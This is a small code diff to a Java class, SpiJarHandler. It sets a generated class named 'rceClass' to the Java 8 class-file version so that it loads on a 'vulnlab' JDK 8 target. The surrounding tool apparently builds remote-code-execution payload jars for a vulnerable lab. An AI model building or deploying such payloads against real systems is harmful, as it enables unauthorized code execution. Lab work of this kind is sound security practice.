@@ -62,6 +62,9 @@ public class SpiJarHandler {
             rceClass.addMethod(CtNewMethod.make(stub, rceClass));
         }
 
+        // Target Java 8 class file version (52) so it loads on vulnlab JDK 8
+        rceClass.getClassFile().setMajorVersion(javassist.bytecode.ClassFile.JAVA_8);
+        rceClass.getClassFile().setMinorVersion(0);
         byte[] classBytes = rceClass.toBytecode();
         rceClass.detach();
 
